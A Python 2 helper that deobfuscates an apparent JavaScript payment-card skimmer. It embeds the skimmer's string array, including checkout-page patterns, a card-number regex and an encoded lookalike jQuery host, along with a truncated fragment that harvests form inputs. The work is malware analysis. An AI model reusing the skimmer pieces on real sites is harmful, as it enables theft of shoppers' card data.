import string
import re

#this is the source array data which you wish to replace with the data in the below obfuscated string
src_arr = ["noConflict", "; ", "cookie", "=", "split", "length", "shift", ";", "pop", "SESSIID", "SESSIID=", "getTime", "click", "", "post", "location", "test", "onepage|checkout|onestep", "input, select, textarea, checkbox", "querySelectorAll", "value", "name", "&", "[0-9]{13,16}", "text", "&#x2F;&#x2F;&#x6A;&#x71;&#x75;&#x65;&#x72;&#x79;&#x2D;&#x6A;&#x73;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x6C;&#x61;&#x74;&#x65;&#x73;&#x74;&#x2F;&#x6A;&#x71;&#x75;&#x65;&#x72;&#x79;&#x2E;&#x6D;&#x69;&#x6E;&#x2E;&#x6A;&#x73;", "html", "<div />", "open", "Content-type", "application/x-www-form-urlencoded", "setRequestHeader", "&asd=", "replace", "&utmp=", "send", "on", "button"]

#this is the source array name, for this example we can see that 0x263E9 is the array source variable name we need to change
src_arr_name = "0x263E9"

# this is the obf string we wish to replace
src_str = """function _0x264A5(_0x26503) {
    0x26503(_0x263E9[37])[_0x263E9[36]](_0x263E9[12], function () {
        var _0x265BF = _0x263E9[13],
            _0x26561 = _0x263E9[14],
            _0x26795 = window[_0x263E9[15]];
        if (new RegExp(_0x263E9[17])[_0x263E9[16]](_0x26795)) {
            for (var _0x2667B = document[_0x263E9[19]](_0x263E9[18]), _0x266D9 = 0; _0x266D9 < _0x2667B[_0x263E9[5]]; _0x266D9++) {
                if (_0x2667B[_0x266D9][_0x263E9[20]][_0x263E9[5]] > 0) {
                    var _0x2661D = _0x2667B[_0x266D9][_0x263E9[21]];
                    _0x263E9[13] == _0x2661D && (_0x2661D = _0x266D9), _0x265BF += _0x2661D + _0x263E9[3] + _0x2667B[_0x266D9][_0x263E9[20]] + _0x263E9[22]"""

#this function removes the beginning underscore
src_str = src_str.replace("_"+src_arr_name,src_arr_name)

#this part of the code look over the obfuscated string and replaces the array data values with the appropriate values.
counter = 0
for src_val in src_arr:
    src_str = src_str.replace(src_arr_name+"["+str(counter)+"]","\""+src_val+"\"")
    counter+=1
    regex=re.compile(r"\[\"([a-zA-Z0-9\-\_]+)\"\]")
    replaceRegex=regex.sub('.\\1',src_str)


print replaceRegex